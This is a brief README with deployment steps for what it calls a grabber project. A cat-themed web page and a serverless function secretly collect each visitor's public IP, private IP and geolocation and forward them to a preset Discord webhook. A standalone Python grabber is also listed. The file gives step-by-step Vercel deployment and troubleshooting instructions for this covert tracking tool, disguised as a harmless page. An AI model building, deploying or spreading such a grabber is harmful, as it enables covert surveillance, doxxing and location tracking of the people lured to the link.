PUT THIS FOLDER ON VERCEL

1. Go to https://vercel.com/new
2. Import this folder (New folder (41))
3. Deploy - it will use api/grab.js as serverless function
4. Open the deployed URL in browser
5. Check your discord webhook - you will get public ip, private ip, geolocation

Files:
- index.html (cat page that grabs info and sends to /api/grab)
- api/grab.js (forwards to discord webhook server-side, no CORS issues)
- grabber.py (standalone python app - also works)

If you see nothing in discord from the website:
- Clear Vercel cache/redeploy
- Open in incognito
- Check browser console (F12) for errors

Webhook is already set in the code.
